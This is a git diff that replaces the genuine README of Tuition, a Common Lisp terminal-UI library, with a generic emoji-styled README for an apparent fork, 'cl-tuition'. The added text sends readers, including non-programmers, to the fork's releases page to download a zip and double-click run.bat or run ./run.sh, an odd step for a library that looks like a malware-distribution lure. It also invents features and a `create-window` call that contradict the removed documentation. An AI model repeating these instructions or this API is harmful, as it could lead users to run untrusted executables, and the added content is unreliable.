@@ -1,409 +1,78 @@
-# Tuition
+# 🎉 cl-tuition - Build Text-Based Interfaces with Ease
 
-<p align="center">
-  <img src="./showcase.png" alt="Tuition showcase" width="720">
-  <br>
-  <a href="https://img.shields.io/badge/lang-Common%20Lisp-8c3ffc"><img src="https://img.shields.io/badge/lang-Common%20Lisp-8c3ffc" alt="Common Lisp"></a>
-  <a href="#license"><img src="https://img.shields.io/badge/license-MIT-brightgreen.svg" alt="MIT License"></a>
-  <br>
-  <em>The fun, functional, and stateful way to build terminal apps in Common Lisp.</em>
-  <br>
-  <sub>Based on The Elm Architecture (TEA). Built with CLOS.</sub>
-</p>
-
-Tuition is a Common Lisp library for building rich, responsive terminal user interfaces (TUIs). It blends the simplicity of TEA with the power of CLOS so you can model state clearly, react to events via generic methods, and render your UI as pure strings.
-
-- Model — a CLOS object representing your application state
-- Messages — CLOS classes describing events (keys, mouse, timers, custom)
-- Update — generic methods that transform the model in response to messages
-- View — a pure function that renders your model to a string
-
-Tuition handles terminal concerns for you (raw mode, alternate screen, input decoding, cursor control) so you can stay focused on your application logic.
-
----
-
-## Concepts
-
-- Model-View-Update: Keep state in a CLOS object, react to messages, and render a pure string view.
-- Messages: Typed events (keys, mouse, timers, custom) dispatched via generic methods for clarity and extensibility.
-- Commands: Functions that return messages asynchronously, enabling timers, I/O, and background work without blocking.
-- Program: A managed loop that sets up the terminal, processes messages, runs commands, and refreshes the screen.
-- Pure Rendering: Rendering returns strings; styling, layout, borders, and reflow are composition-friendly utilities.
-- Components: Reusable widgets (spinner, progress, list, table, text input) that manage their own state and view.
-- Zones: Named regions to map mouse coordinates to stable identifiers for hover/click interactions.
-
-## Features
+## 📥 Download Now
+[![Download cl-tuition](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/anaomaciel/cl-tuition/releases)
 
-- TEA-style architecture with CLOS: message-specialized `tui:update-message`
-- Concurrent commands for non-blocking I/O and timers
-- Keyboard and mouse input decoding (with modifiers and motion)
-- Terminal control (raw mode, alternate screen, cursor, clear)
-- Styling utilities (bold/italic/underline/colors, adaptive colors)
-- Layout helpers (horizontal/vertical joins, placement and alignment)
-- Borders (normal, rounded, thick, double, block, ASCII, markdown)
-- Reflow helpers (wrapping, truncation, ellipsizing, indentation)
-- Built-in components: spinner, progress bar, list, table, text input
-- Zones for advanced mouse interactions (define and query named regions)
+## 🚀 Getting Started
+Welcome to cl-tuition! This library helps you create text-based user interfaces (TUIs) using Common Lisp. You don’t need to be a programmer to use it; our simple steps guide you through setting it up.
 
-### Gallery
+## 📂 System Requirements
+Before you download, ensure your computer meets these requirements:
 
-<p>
-  <img src="assets/gifs/file-manager.gif" alt="File Manager">
-  <p>
-  <br>
-  <img src="assets/gifs/spinner.gif" alt="Spinner">
-  <p>
-  <br>
-  <img src="assets/gifs/progress.gif" alt="Progress">
-  <p>
-  <br>
-  <sub>More GIFs/screenshots coming from the examples directory.</sub>
-</p>
+- **Operating System**: Windows, macOS, or Linux
+- **Common Lisp**: Install a Common Lisp implementation such as SBCL or CCL.
+- **RAM**: At least 512 MB
+- **Disk Space**: Minimum of 50 MB available
 
-## Quick Start
+## 🛠 Installation
+### Step 1: Visit the Download Page
+To begin, go to our [Releases page](https://github.com/anaomaciel/cl-tuition/releases). Here, you will find the latest version of cl-tuition available for download.
 
-### Hello, world
+### Step 2: Download the Latest Release
+Find the latest release version and click on the link to download the file. The file is usually provided in a format ready for use, so you won’t need to install extra tools.
 
-```lisp
-(defpackage #:hello-world
-  (:use #:cl #:tuition))
+### Step 3: Extract the Files
+Once the file is downloaded, locate it in your Downloads folder or wherever your browser saves files. 
 
-(in-package #:hello-world)
+1. **For Windows**: Right-click the zip file and select "Extract All". Follow the prompts to extract the contents.
+2. **For macOS**: Double-click the zip file, and it will automatically extract to the same location.
+3. **For Linux**: Use the command `unzip filename.zip` in your terminal.
 
-(defclass hello-model () ())
+### Step 4: Running cl-tuition
+Navigate to the folder where you extracted the files. You will find an executable file or script to start the application. 
 
-(defmethod tui:init ((model hello-model))
-  nil) ; no initial command
+- **Windows**: Double-click the `run.bat` file to start.
+- **macOS/Linux**: Open a terminal in the folder and run the command `./run.sh`.
 
-(defmethod tui:update-message ((model hello-model) (msg tui:key-msg))
-  (declare (ignore msg))
-  (values model (tui:quit-cmd)))
+## ⭐ Features
+With cl-tuition, you can enjoy these features:
 
-(defmethod tui:view ((model hello-model))
-  (tui:bold "Hello, World! Press any key to exit."))
+- **Easy Setup**: Quick download and straightforward instructions make it user-friendly.
+- **Cross-Platform Support**: Runs smoothly on Windows, macOS, and Linux.
+- **Customizable UI**: Create and modify interfaces easily using simple code snippets.
+- **Support for Multiple Input Types**: Accept various user inputs seamlessly.
 
-(defun main ()
-  (tui:run (tui:make-program (make-instance 'hello-model))))
-```
+## 📘 Usage
+Once you have installed cl-tuition, you can start creating your TUI. Here’s a simple example to get you started:
 
-### Interactive counter
+1. Open your Common Lisp environment.
+2. Load the cl-tuition library using the code:
+   ```lisp
+   (load "path/to/cl-tuition")
+   ```
+3. Create a simple window with:
+   ```lisp
+   (create-window "Welcome to cl-tuition!")
+   ```
 
-```lisp
-(defpackage #:counter-demo
-  (:use #:cl #:tuition))
+Expand on this by exploring the other functions and methods available in cl-tuition.
 
-(in-package #:counter-demo)
+## ⚙️ Configuration
+Customization is key! You can change the appearance and behavior of your TUI:
 
-(defclass counter-model ()
-  ((count :initform 0 :accessor count)))
+- **Themes**: Change colors and styles to fit your visual preference.
+- **Layouts**: Modify the layout of your interface to enhance user experience.
 
-(defmethod tui:init ((model counter-model)) nil)
+You can find more details about configuration in the documentation provided with your download.
 
-(defmethod tui:update-message ((model counter-model) (msg tui:key-msg))
-  (let ((key (tui:key-msg-key msg)))
-    (cond
-      ((and (characterp key) (char= key #\q))
-       (values model (tui:quit-cmd)))
-      ((and (characterp key) (char= key #\+))
-       (incf (count model))
-       (values model nil))
-      ((and (characterp key) (char= key #\-))
-       (decf (count model))
-       (values model nil))
-      (t (values model nil)))))
+## 🗨️ Help & Support
+If you encounter any issues or have questions about using cl-tuition, feel free to reach out for help. You can visit our [issue tracker](https://github.com/anaomaciel/cl-tuition/issues) to report problems or request features.
 
-(defmethod tui:view ((model counter-model))
-  (format nil "Count: ~D~%~%Press + to increment, - to decrement, q to quit"
-          (count model)))
+## 📅 Contributing
+Want to improve cl-tuition? We welcome contributions! You can fork the repository, create your changes, and submit a pull request. 
 
-(defun main ()
-  (tui:run (tui:make-program (make-instance 'counter-model))))
-```
+## 🔗 Additional Resources
+- [Common Lisp Documentation](https://www.cliki.net/)
+- [Tutorial on TUIs](https://www.tui-tutorials.com)
 
----
-
-## Tutorial
-
-Bubble Tea-style programs are comprised of a model that describes your application state and three simple generic functions:
-
-- `tui:init` — returns an initial command (or NIL)
-- `tui:update` (or `tui:update-message`) — transforms state in response to messages
-- `tui:view` — renders your model to a string
-
-See the Quick Start above for a minimal example and the examples/ directory for complete, runnable programs.
-
----
-
-## Core Concepts
-
-### Model
-
-Your application state lives in a CLOS object:
-
-```lisp
-(defclass my-app ()
-  ((username :initarg :username :accessor username)
-   (messages :initform '() :accessor messages)
-   (input :initform "" :accessor input)))
-```
-
-### Messages and Update
-
-Events are message objects. Prefer specializing `tui:update-message` by message class for clarity and extensibility.
-
-```lisp
-;; Built-in key message
-(defmethod tui:update-message ((model my-app) (msg tui:key-msg))
-  (let ((key (tui:key-msg-key msg)))
-    (cond
-      ((and (characterp key) (char= key #\q)) (values model (tui:quit-cmd)))
-      (t (values model nil)))))
-
-;; Custom message
-(tui:defmessage data-loaded
-  ((items :initarg :items :accessor items)))
-
-(defmethod tui:update-message ((model my-app) (msg data-loaded))
-  (setf (messages model) (items msg))
-  (values model nil))
-
-;; Optional fallback when no method matches
-(defmethod tui:update ((model my-app) msg)
-  (declare (ignore msg))
-  (values model nil))
-```
-
-### View
-
-The view renders your model to a string. Tuition only needs a string; compose helpers however you like.
-
-```lisp
-(defmethod tui:view ((model my-app))
-  (let ((header (tui:bold "My Application"))
-        (content (format nil "Messages: ~{~A~^, ~}" (messages model)))
-        (footer (format nil "User: ~A" (username model))))
-    (tui:join-vertical tui:+left+ header content footer)))
-```
-
-### Commands
-
-Commands are functions that return messages asynchronously.
-
-```lisp
-;; Create a delayed message
-(defun tick (seconds msg)
-  (lambda ()
-    (sleep seconds)
-    msg))
-
-;; Built-in helpers
-(tui:quit-cmd)
-(tui:batch cmd1 cmd2)
-(tui:cmd-sequence cmd-a cmd-b cmd-c)
-```
-
-### Program Options
-
-`tui:make-program` accepts options that affect terminal behavior and input decoding:
-- `:alt-screen` uses the terminal’s alternate screen buffer for clean entry/exit.
-- `:mouse` controls mouse reporting granularity (`:cell-motion`, `:all-motion`, or `NIL` to disable).
-
-```lisp
-(tui:make-program model
-  :alt-screen t            ; Use alternate screen buffer
-  :mouse :cell-motion)     ; :cell-motion | :all-motion | NIL
-```
-
-## Terminal lifecycle
-
-Use `tui:with-raw-terminal` when you want terminal control outside the main program loop. It ensures proper cleanup and offers restarts to recover from setup issues.
-
-This is useful for short, scripted interactions or when embedding Tuition rendering in an existing tool with its own control flow.
-
-```lisp
-(tui:with-raw-terminal (:alt-screen t :mouse :cell-motion)
-  (format t "Hello in raw mode!~%")
-  (finish-output))
-```
-
-Restarts during setup:
-- `USE-NO-RAW` — continue without entering raw mode
-- `RETRY` — retry entering raw mode
-- `ABORT` — abort setup and return
-
-## Styling and layout
-
-### Text styling
-
-Use text styling helpers to apply ANSI attributes (bold, italic, underline) and colors in a composable way. Styles can be nested and combined, or prebuilt via a style object and applied to arbitrary strings. This keeps rendering pure while letting you centralize theme choices.
-
-```lisp
-(tui:bold "Important text")
-(tui:italic "Emphasized")
-(tui:underline "Underlined")
-(tui:colored "Red text" :red)
-
-;; Compose styles with a style object
-(tui:render-styled
-  (tui:make-style :foreground tui:*fg-bright-blue*
-                  :background tui:*bg-black*
-                  :bold t :underline t)
-  "Styled text")
-```
-
-### Layout and placement
-
-Layout helpers let you arrange blocks of text without calculating offsets by hand. Join content horizontally or vertically with alignment, then optionally position the result within a given width/height or the terminal’s current size. This encourages building UIs from simple, pure string blocks.
-
-```lisp
-(tui:join-horizontal tui:+top+ "A" "B" "C")
-(tui:join-vertical tui:+left+ "Title" "Body" "Footer")
-(tui:place 40 10 tui:+center+ tui:+middle+ "Centered block")
-```
-
-### Borders
-
-Borders provide quick framing for panels, tables, and dialogs. Pick from several predefined styles (rounded, thick, double, ASCII, markdown) to match the tone of your UI, or render with plain blocks for a minimal look.
-
-```lisp
-(tui:render-border (tui:make-border :style tui:*border-rounded*) "Panel")
-```
-
-## Reflow utilities
-
-Reflow functions help you shape text to fit the terminal: wrap long paragraphs, truncate with ellipses, or indent multi‑line blocks. They are designed to work well with styled strings so you can format first and style later (or vice‑versa) without miscounting visible width.
-
-```lisp
-(tui:wrap-text "A long paragraph to wrap neatly." 40 :indent 2)
-(tui:truncate-text (tui:bold "Styled text") 20 :ellipsis "...")
-(tui:indent-lines "Line A\nLine B" 4)
-```
-
-## Input and mouse
-
-Keyboard events arrive as `tui:key-msg` values with helpers to inspect the key and modifier state. Mouse input (when enabled) provides cell-based coordinates, button information, and a hierarchical event system for press, release, drag, move, and scroll events.
-
-Enable mouse reporting via `:mouse` in `tui:make-program` (see Program Options) and specialize `tui:update-message` on the specific mouse event types.
-
-```lisp
-;; Key message helpers
-(tui:key-msg-p msg)
-(tui:key-msg-key msg)   ; Character or keyword (:up, :down, :enter, ...)
-(tui:key-msg-ctrl msg)
-(tui:key-msg-alt msg)
-
-;; Mouse event hierarchy - specialize on specific event types
-(defmethod tui:update-message ((model my-app) (msg tui:mouse-press-event))
-  ;; Handle button press
-  (let ((x (tui:mouse-event-x msg))
-        (y (tui:mouse-event-y msg))
-        (button (tui:mouse-event-button msg)))  ; :left, :right, :middle
-    (values model nil)))
-
-(defmethod tui:update-message ((model my-app) (msg tui:mouse-release-event))
-  ;; Handle button release
-  (values model nil))
-
-(defmethod tui:update-message ((model my-app) (msg tui:mouse-drag-event))
-  ;; Handle drag (motion with button held)
-  (values model nil))
-
-(defmethod tui:update-message ((model my-app) (msg tui:mouse-move-event))
-  ;; Handle move (motion without button)
-  (values model nil))
-
-(defmethod tui:update-message ((model my-app) (msg tui:mouse-scroll-event))
-  ;; Handle scroll wheel
-  (let ((direction (tui:mouse-scroll-direction msg)))  ; :up or :down
-    (values model nil)))
-
-;; All mouse events support modifier flags
-(tui:mouse-event-shift msg)
-(tui:mouse-event-alt msg)
-(tui:mouse-event-ctrl msg)
-```
-
-## Components
-
-Tuition includes a few reusable building blocks. Each component exposes a small protocol of functions or methods for init, update, and view.
-
-Use components when you want common interactions without re‑implementing state machines (for example, cursor management for text inputs or tick scheduling for spinners). Keep the component instance in your model, delegate messages to it in `update`, and render with the component’s `view`. For a deeper guide, see `src/components/README.md`.
-
-```lisp
-;; Spinner
-(defparameter *sp* (tuition.components.spinner:make-spinner))
-(multiple-value-bind (sp cmd) (tuition.components.spinner:spinner-update *sp* (tuition.components.spinner:make-spinner-tick-msg :id (tuition.components.spinner:spinner-id *sp*)))
-  (declare (ignore cmd))
-  (tuition.components.spinner:spinner-view sp))
-
-;; Progress
-(tuition.components.progress:progress-view
-  (tuition.components.progress:make-progress :percent 0.42))
-
-;; List
-(let ((lst (tuition.components.list:make-list-view :items '("A" "B" "C"))))
-  (tuition.components.list:list-view-render lst))
-
-;; Table
-(tuition.components.table:table-render
-  (tuition.components.table:make-table
-    :headers '("ID" "Name")
-    :rows '((1 "Alice") (2 "Bob"))))
-
-;; Text input
-(tuition.components.textinput:textinput-view
-  (tuition.components.textinput:make-textinput :placeholder "Type here"))
-```
-
-## Zones (mouse areas)
-
-Zones let you attribute portions of the rendered screen to symbolic identifiers and query hover/clicks reliably.
-
-Use zones to implement clickable lists, buttons, and hover effects without manual hit‑testing. Mark regions during rendering and later resolve pointer coordinates back to a stable identifier.
-
-- Create a `zone-manager`
-- Mark regions while rendering
-- Query with pointer coordinates to identify the active zone
-
-See `zone.lisp` for the API and the `examples/zones*` demos for usage patterns.
-
-## Examples
-
-The `examples/` directory contains runnable demos showcasing Tuition features. See `examples/README.md` for a complete list and descriptions of all available examples.
-
-By the way
-- See the components in `src/components/` for reusable widgets akin to Charmbracelet’s [Bubbles].
-- Styling and layout utilities are inspired by [Lip Gloss].
-- Markdown rendering is inspired by [Glamour].
-- Spring-based animation draws from [Harmonica].
-
-[Bubbles]: https://github.com/charmbracelet/bubbles
-[Lip Gloss]: https://github.com/charmbracelet/lipgloss
-[Glamour]: https://github.com/charmbracelet/glamour
-[Harmonica]: https://github.com/charmbracelet/harmonica
-
-## Error handling
-
-Tuition uses conditions for internal errors. You can customize reporting by rebinding `tui:*error-handler*`.
-
-```lisp
-(let ((tui:*error-handler*
-        (lambda (where c)
-          (format *error-output* "[~A] ~A~%" where c))))
-  (tui:run (tui:make-program (make-instance 'hello-world::hello-model))))
-```
-
-## Dependencies
-
-- `bordeaux-threads` — cross‑platform threading
-- `trivial-channels` — thread‑safe message passing
-
-## License
-
-MIT License — see `LICENSE`.
-
-## Author and Acknowledgments
-
-Tuition was creates by Anthony Green, with the assistance of various
-LLMs, and drawing inspiraton from the Charmbracelet ecosystem (Bubble
-Tea, Lip Gloss, Bubbles, Bubblezone, Harmonica).
+Thank you for using cl-tuition! We're excited to see what you create.
